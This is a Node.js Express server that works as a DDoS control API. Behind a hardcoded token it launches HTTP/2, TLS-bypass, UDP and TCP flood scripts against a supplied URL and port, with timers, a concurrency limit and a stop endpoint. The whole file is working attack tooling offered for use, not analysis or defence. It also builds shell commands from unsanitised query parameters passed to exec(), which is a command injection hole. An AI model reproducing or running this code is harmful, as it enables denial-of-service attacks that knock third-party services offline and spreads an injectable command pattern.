const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = 7777;

let definitions = {
    ServerData: {
        Limit: 20,
        Ongoing: 0
    },
    Attacks: [],
    NextAttackID: 1
};

let methods = {
    layer7: {
        H2FLASH: {
            Command: 'cd /root/.xyran/ && node h2-flash.js {url} {time} 64 4 px.txt',
            Type: 'layer7'
        },
        H2FLOOD: {
            Command: 'cd /root/.xyran/ && node h2-flood.js {url} {time} 64 4 px.txt',
            Type: 'layer7'
        },
        TLSBYPASS: {
            Command: 'cd /root/.xyran/ && node tls-bypass.js {url} {time} 62 4 px.txt',
            Type: 'layer7'
        },
        HTTPS: {
            Command: 'cd /root/.xyran/ && node https.js {url} {time} 64 4 px.txt --query %RAND% --log 200',
            Type: 'layer7'
        },
        MIXBIL: {
            Command: 'cd /root/.xyran/ && node mixbil.js {url} {time} 32 4 px.txt',
            Type: 'layer7'
        },
        TLS: {
            Command: 'cd /root/.xyran/ && node tls.js {url} {time} 32 4 px.txt',
            Type: 'layer7'
        }
    },
    layer4: {
        UDP: {
            Command: 'cd /root/.xyran/ && gcc udp.c -o udp && ./udp {url} 53 {time}',
            Type: 'layer4'
        },
        TCP: {
            Command: 'cd /root/.xyran && gcc tcp.c -o tcp && ./tcp {url} {port} 3 {time}',
            Type: 'layer4'
        }
    }
};

function getMethod(name) {
    for (let group in methods) {
        if (methods[group][name]) {
            return methods[group][name];
        }
    }
    return null;
}

function replacePlaceholders(command, replacements) {
    for (let placeholder in replacements) {
        command = command.replace(new RegExp(placeholder, 'g'), replacements[placeholder]);
    }
    return command;
}

function sendAttack(req, res, url, method, timeStr, port) {
    if (definitions.ServerData.Ongoing >= definitions.ServerData.Limit) {
        return res.json({ error: true, message: "Server limit reached, cannot handle more attacks!" });
    }

    let methodData = getMethod(method);
    if (!methodData) {
        return res.json({ error: true, message: "Method not found!" });
    }

    let timeInt = parseInt(timeStr);
    if (isNaN(timeInt)) {
        return res.json({ error: true, message: "Invalid time parameter!" });
    }

    let attackID = definitions.NextAttackID++; // Increment counter untuk ID numerik
    let commandParsed = replacePlaceholders(methodData.Command, {
        '{url}': url,
        '{time}': timeStr,
        '{port}': port
    });

    definitions.ServerData.Ongoing++;
    startAttack(commandParsed, attackID, url, port, timeInt, method);

    console.log(`[INFO] Attack sent successfully (ID: ${attackID}, Method: ${method}, URL: ${url})`);

    return res.json({
        success: true,
        id: attackID,
        message: `Attack sent successfully`,
        details: {
            url,
            method,
            time: timeStr,
            port
        }
    });
}

function startAttack(command, attackID, url, port, timeInt, method) {
    const process = exec(command, (err, stdout, stderr) => {
        if (err) {
            definitions.ServerData.Ongoing--;
            return;
        }

        console.log(stdout);
    });

    definitions.Attacks.push({
        AttackID: attackID,
        Process: process,
        TimeLeft: timeInt
    });
}

function stopAttack(req, res) {
    let attackID = parseInt(req.query.attackId);
    if (!attackID || isNaN(attackID)) {
        return res.json({ error: true, message: "Invalid attack ID!" });
    }

    let attackIndex = definitions.Attacks.findIndex(a => a.AttackID === attackID);
    if (attackIndex === -1) {
        return res.json({ error: true, message: "Attack ID not found!" });
    }

    let attack = definitions.Attacks[attackIndex];
    attack.Process.kill(); // Menghentikan proses
    definitions.ServerData.Ongoing--;
    definitions.Attacks.splice(attackIndex, 1);

    console.log(`[INFO] Attack stopped (ID: ${attackID})`);
    return res.json({ success: true, message: `Attack ${attackID} has been stopped` });
}

function attackStopper() {
    setInterval(() => {
        let remainingAttacks = [];

        definitions.Attacks.forEach(attack => {
            if (attack.TimeLeft <= 0) {
                attack.Process.kill(); // Menghentikan proses ketika waktu habis
                definitions.ServerData.Ongoing--;
                console.log(`[INFO] Attack expired (ID: ${attack.AttackID})`);
            } else {
                attack.TimeLeft--;
                remainingAttacks.push(attack);
            }
        });

        definitions.Attacks = remainingAttacks;
    }, 1000);
}

app.get('/api', (req, res) => {
    let { url, port, method, time, token } = req.query;

    if (token !== 'xyran') {
        return res.status(401).json({ error: true, message: "Invalid Token!" });
    }

    if (url && port && method && time) {
        sendAttack(req, res, url, method, time, port);
    } else {
        return res.json({ error: true, message: "Invalid parameters! Required: url, port, method, time" });
    }
});

app.get('/stop', stopAttack);

app.listen(port, () => {
    console.log(`[INFO] API listening on port: ${port}`);
    attackStopper();
});